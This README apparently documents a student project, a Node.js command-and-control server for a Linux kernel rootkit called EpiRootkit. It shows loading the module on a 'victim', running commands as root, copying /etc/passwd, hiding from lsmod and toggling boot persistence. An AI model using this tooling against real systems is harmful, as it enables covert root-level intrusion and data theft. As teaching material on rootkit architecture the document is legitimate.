---
title: "README"
description: "C2 server and attacking program architecture"
icon: "dashboard"
date: "2025-05-25T00:00:00+01:00"
lastmod: "2025-05-25T16:00:00+01:00"
draft: false
toc: true
weight: 31
---

# Attacking Program Overview

Professional C2 (Command & Control) server built with Node.js providing CLI interface for managing EpiRootkit connections.

## Quick Start

```bash
# Install and start
cd attacking_program && pnpm install && pnpm start
# Server started on port 4444
# Web interface: http://localhost:3000

# Basic usage
c2-server$ ls
# • Client-1 - UNAUTHENTICATED - Last seen: 6:13:09 PM

c2-server$ auth Client-1 password
# ✓ Authentication successful
```

## Architecture

### Core Components
- **CLI Interface**: Vorpal.js-based interactive commands
- **C2 Server**: Node.js TCP server for rootkit communication
- **Web Interface**: Basic REST API and Socket.IO dashboard

### Technology Stack
- **Runtime**: Node.js 18+ with pnpm package manager
- **CLI**: Vorpal.js for interactive command interface
- **Server**: Express.js with Socket.IO for real-time updates
- **Encryption**: Optional XOR cipher for traffic obfuscation (currently disabled on rootkit side)

## CLI Commands

### Client Management
```bash
ls                          # List connected clients
auth <client> <password>    # Authenticate with client using dynamic password
status <client>             # Get client status information
config <client>             # Interactive configuration menu
```

### Operations
```bash
exec <client> <command>                     # Execute shell command
upload <client> <local> <remote>            # Upload file to victim
download <client> <remote> <local>          # Download file from victim
```

## Interactive Configuration

```bash
c2-server$ config Client-1
# ┌─ Rootkit Configuration - Client-1
#   • [X] Module Hiding: ENABLED
#   • [X] Persistence: ENABLED
# 
# ? Select option: Toggle Module Hiding
# ✓ Module hiding disabled
```

Available options:
- **Module Hiding**: Show/hide rootkit from `lsmod`
- **Persistence**: Install/remove boot persistence
- **Status Refresh**: Update current configuration

## Live Demo Session

### Connection & Authentication
```bash
# Start server
pnpm start

# Load rootkit on victim
sudo insmod epirootkit.ko
# [C2 shows] New client connected: Client-1

# Authenticate with dynamic password
c2-server$ auth Client-1 password
# ✓ Authentication successful
```

### Command Execution
```bash
c2-server$ exec Client-1 whoami
# Exit code: 0
# Output:
# root

c2-server$ exec Client-1 uname -a
# Exit code: 0
# Output:
# Linux victim 5.4.0-74-generic #83-Ubuntu...
```

### File Operations
```bash
c2-server$ upload Client-1 ./test.txt /tmp/test.txt
# ✓ File uploaded successfully (1024 bytes)

c2-server$ download Client-1 /etc/passwd ./passwd_copy
# ✓ File downloaded successfully (2048 bytes)
```

## Configuration

### Server Settings
```bash
# attacking_program/config.env
C2_PORT=4444                    # C2 server port
WEB_PORT=3000                   # Web interface port
ENABLE_ENCRYPTION=true          # Enable XOR encryption (rootkit has it disabled)
ENCRYPTION_KEY=MySecretKey123   # Encryption key
PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86  # SHA-512 hash of "password"
```

### Authentication
Uses dynamic password authentication where:
1. C2 sends plain text password via `auth <client> <password>` command
2. Rootkit hashes the password using SHA-512 and compares with stored hash
3. Authentication response indicates success/failure
4. Includes rate limiting (5 attempts max) and session timeout (1 hour)

## Security Features

- **Dynamic authentication**: SHA-512 hashing with brute force protection
- **Optional encryption**: XOR cipher for traffic obfuscation (currently mismatched - enabled on C2, disabled on rootkit)
- **Session management**: Automatic timeout and cleanup
- **Access control**: Commands require authentication

## Web Interface

Basic web dashboard available at `http://localhost:3000` with:
- REST API for client management
- Socket.IO for real-time updates
- Simple client status dashboard

## Current Configuration Issues

**⚠️ Encryption Mismatch**: The C2 server has encryption enabled (`ENABLE_ENCRYPTION=true`) but the rootkit has it disabled (`ENABLE_ENCRYPTION 0`). This means:
- C2 expects encrypted communication
- Rootkit sends unencrypted messages
- Communication works but is unencrypted despite C2 configuration

To fix: Either enable encryption in rootkit or disable it in C2 server.

---

Provides complete C2 functionality with professional CLI interface and web dashboard for rootkit management. 